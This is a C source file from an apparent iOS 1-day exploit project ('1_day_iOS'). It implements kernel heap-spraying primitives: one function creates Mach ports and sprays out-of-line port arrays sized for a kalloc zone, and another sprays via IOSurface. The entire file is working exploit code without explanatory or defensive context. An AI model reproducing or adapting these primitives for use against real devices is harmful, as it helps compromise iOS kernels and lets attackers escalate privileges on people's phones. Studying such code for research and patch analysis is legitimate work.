//
//  spray.c
//  1_day_iOS
//
//  Created by System on 25/11/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "spray.h"
#include "kernel_alloc.h"
#include "iosurface.h"

const uint32_t kSprayCount = 32;



int spray_ool_ports(size_t alloc_size ,mach_port_t port){
    size_t spray_port_count = 50;
    mach_port_t *ool_holding_ports = (mach_port_t *)malloc(sizeof(mach_port_t) * spray_port_count);
    for(int i=0;i<spray_port_count;i++){
        mach_port_options_t options = {};
        mach_port_t port_ = MACH_PORT_NULL;
        kern_return_t kr = mach_port_construct(mach_task_self(), &options , 0 , &port_);
        
        if(kr != KERN_SUCCESS){
            printf("ERROR!! failed on making port.\n");
        }
        ool_holding_ports[i] = port_;
    }
    //now we made spray_port_count of ports to make ool ports !
    
    const size_t ool_port_count = alloc_size / sizeof(uint64_t);
    mach_port_t *ool_ports = (mach_port_t * )malloc(sizeof(mach_port_t) * ool_port_count);
    for(int i=0;i<ool_port_count;i++){
        ool_ports[i] = port;
    }
    const size_t ool_spray_size = 64000;
    size_t spray_size = ool_ports_spray_size(ool_holding_ports,&spray_port_count,message_size_for_kalloc_size(512),ool_ports , ool_port_count,MACH_MSG_TYPE_COPY_SEND, ool_spray_size);
    if(!spray_size){
        return 0;
        
    }
    else{
        return 1;
    }
}
int spray(void *data, uint32_t size, uint32_t count){
    return IOSurface_spray_with_gc(/*array_count=*/kSprayCount,
                                   /*array_length=*/count, data, size,
                                   /*callback=*/NULL);
}
